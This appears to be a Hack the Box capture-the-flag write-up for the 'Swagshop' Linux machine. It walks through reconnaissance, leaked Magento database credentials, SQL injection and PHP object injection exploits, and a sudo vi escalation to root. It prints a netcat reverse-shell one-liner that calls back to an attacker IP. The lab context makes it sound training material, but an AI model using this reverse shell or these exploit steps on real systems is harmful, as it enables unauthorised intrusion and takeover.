# Hack the Box - Swagshop
```CSS
Machine IP: 10.10.10.140 - Linux

Tags: magento
Vulnerabilities:
  - Magento SQL Injection
  - Magento PHP Object Injection
```

## NMAP
```CSS
▶ nmap -Pn -sS -p- 10.10.10.140 -T4 --min-rate 1000 -oN nmap.surface

Nmap scan report for 10.10.10.140
Host is up (0.20s latency).
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```CSS
▶ nmap -sC -sV -p 22,80 10.10.10.140 -oN nmap.deep

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6552bd24e8fa3817261379a12f624ec (RSA)
|   256 2e30007a92f0893059c17756ad51c0ba (ECDSA)
|_  256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## HTTP
![image](https://user-images.githubusercontent.com/83878909/230385940-576fb9d4-0154-4a75-af4c-ffeae45b4231.png)

---

## Magento
- Tool: [magescan](https://github.com/steverobbins/magescan)
```CSS
▶ magescan.phar scan:all http://swagshop.htb
```
- Magento Version Information
![image](https://user-images.githubusercontent.com/83878909/230405839-266cdc0e-97b7-4b08-bd5a-0b2afc29502f.png)
- Sensitive Files
- Path: `http://swagshop.htb/app/etc/local.xml`
![image](https://user-images.githubusercontent.com/83878909/230406379-b3b0b66c-61ee-441d-93c7-dc25d708673c.png)
![image](https://user-images.githubusercontent.com/83878909/230406550-166475e5-9eb4-4f61-a20a-02d9a99e6496.png)
- MySQL Credentials: `root:fMVWh7bDHpgZkyfqQXreTjU9` | DB Name: `swagshop`

---

### Exploit
  - Searchsploit
![image](https://user-images.githubusercontent.com/83878909/230573995-d8195c5b-bb3f-43aa-922d-b665285d5004.png)
  - Modify exploit
![image](https://user-images.githubusercontent.com/83878909/230575074-34a8d22c-9187-4d74-8831-77f5f98c8340.png)
  - Run Exploit
![image](https://user-images.githubusercontent.com/83878909/230575192-080770c9-d1bc-4cc1-92ac-b2b19458de11.png)
  - Log in page URL: `https://swagshop.htb/index.php/admin`
  - Log in to Admin Panel with creds: `forme:forme`
![image](https://user-images.githubusercontent.com/83878909/230575373-03c3995f-6d22-4d80-b6f0-de065987d98a.png)
  - Admin Panel Accessible
![image](https://user-images.githubusercontent.com/83878909/230575645-6d0c0532-f73f-4b5c-a27e-833c806b0dd7.png)

  - Searchsploit
![image](https://user-images.githubusercontent.com/83878909/230576847-3317eaae-ea23-4d19-9f95-53fb7da677db.png)
  - Modify Exploit (username, password and install date) The original exploit did not work, modified exploit is in my Exploits repository.
  - Retrieve install date: `http://swagshop.htb/app/etc/local.xml`
![image](https://user-images.githubusercontent.com/83878909/230707818-894e563e-de27-4c7a-b528-cf3ec299b1cc.png)
  - Run Exploit
  - Reverse Shell(Bash): `"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 9001 >/tmp/f"`
![image](https://user-images.githubusercontent.com/83878909/230712785-8d0eb9cb-b64b-458b-9764-0cee1e3cedfc.png)

---

### Privilege Escaltion
  - Run: `sudo -l`
![image](https://user-images.githubusercontent.com/83878909/230713433-59c5b31e-e861-4602-b6dd-79247b41906f.png)
  - Can execute any file using `vi` as root located in `/var/www/html/*`.
  - Create a file `a` or with any name, not necessarily `a` using sudo.
  - From within `Vi` spawn a sshell as bash. 
![image](https://user-images.githubusercontent.com/83878909/230713860-7540abca-3e4d-4f80-b657-0c4b132fceb1.png)

---
